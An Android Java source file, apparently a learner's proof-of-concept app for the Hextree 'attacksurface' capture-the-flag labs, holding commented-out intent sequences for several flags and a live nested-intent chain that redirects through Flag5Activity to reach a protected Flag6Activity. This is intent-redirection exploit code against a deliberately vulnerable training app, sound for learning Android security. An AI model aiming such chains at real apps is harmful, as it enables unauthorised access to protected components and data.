package com.example.testinghextreelabs;

import static android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        // Handle window insets
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Set up the intent testing button
        Button intentButton = findViewById(R.id.button);
        intentButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                testIntent();
            }
        });
    }

    private void testIntent() {

        /*
        using this as a basic way to set up a template for
        the hex tree labs I will comment out each flag specifcally fro the intents
         for the poc only leaving the activity and the Toast and the new intent
         */

        try {
            // Create an explicit intent
            //Intent testIntent = new Intent();

            // PoC flag 1
            //testIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");

            /*PoC flag2
            this is a setup basically I can see the string it is looking for
            I can utilize the set action to set what the action is and then
            utlilizing the if statement.

            testIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
            testIntent.setAction("io.hextree.action.GIVE_FLAG");
            */

            /*
            PoC 3
            this just needs me to set the action along with the  setting data that was being expected
            testIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity");
            testIntent.setAction("io.hextree.action.GIVE_FLAG");
            testIntent.setData(Uri.parse("https://app.hextree.io/map/android"));
            */


            /*
            PoC lab 4
            I do not understand why the hell it needs to be in reverse order

            Intent exploitIntent3 = new Intent();
            exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
            exploitIntent3.setAction("GET_FLAG_ACTION");
            utils.showDialog(this, exploitIntent3);
            startActivity(exploitIntent3);

            Intent exploitIntent2 = new Intent();
            exploitIntent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
            exploitIntent2.setAction("BUILD_ACTION");
            utils.showDialog(this, exploitIntent2);
            startActivity(exploitIntent2);

            Intent exploitIntent = new Intent();
            exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
            exploitIntent.setAction("PREPARE_ACTION");
            utils.showDialog(this, exploitIntent);
            startActivity(exploitIntent);
            */
          

          /*
           PoC lab 5 
           intent within intents note becomes more difficult because I need to reverse the intent flow in this case and put
           the extra values as needed 

            Intent exploitIntent = new Intent();    
            exploitIntent.putExtra("reason", "back");

            Intent intent2 = new Intent();
            intent2.putExtra("return", 42);
            intent2.putExtra("nextIntent", exploitIntent);

            Intent FinalIntent = new Intent();
            FinalIntent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity"));
            FinalIntent.putExtra("android.intent.extra.INTENT", intent2);

            utils.showDialog(this, FinalIntent);
            startActivity(FinalIntent);
          */


            /*

            PoC: 7
            this is an intent that utilzes the activity flow and the fact that an activity is currently running then
            it moves the activity to the top of the stack ensuring it properly runs
            // Step 1: Send intent with action "OPEN"
        Intent openIntent = new Intent();
        openIntent.setAction("OPEN");
        openIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
        startActivity(openIntent);

      // Step 2: Send intent with action "REOPEN" after a delay
        new Handler().postDelayed(() -> {
            Intent reopenIntent = new Intent();
            reopenIntent.setAction("REOPEN");
            reopenIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
            reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // 0x2000000
            startActivity(reopenIntent);
        }, 500);
*/


            Intent exploitIntent = new Intent();
            exploitIntent.putExtra("reason", "next");
            exploitIntent.setFlags(FLAG_GRANT_READ_URI_PERMISSION);
            exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity"));

            Intent intent2 = new Intent();
            intent2.putExtra("return", 42);
            intent2.putExtra("nextIntent", exploitIntent);


            Intent FinalIntent = new Intent();
            FinalIntent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity"));
            FinalIntent.putExtra("android.intent.extra.INTENT", intent2);

            utils.showDialog(this, FinalIntent);
            startActivity(FinalIntent);
            finish();

        } catch (Exception e) {
            Toast.makeText(this, "Intent failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }
}
